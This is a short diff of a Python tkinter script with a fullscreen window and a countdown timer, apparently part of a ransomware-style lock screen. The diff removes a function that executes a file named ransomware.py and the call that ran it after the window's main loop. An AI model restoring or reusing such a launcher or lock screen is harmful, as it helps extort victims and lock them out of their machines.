@@ -16,12 +16,6 @@ height = root.winfo_screenheight()
 root.attributes('-fullscreen',True)
 
 
-def start_r():
-    exec(open("ransomware.py").read())
-
-
-
-
 def start_timer(countdown):
     if countdown >= 0:
             hours, remainder = divmod(countdown, 3600)
@@ -102,4 +96,4 @@ frame1.pack()
 
 
 root.mainloop()
-start_r()
+
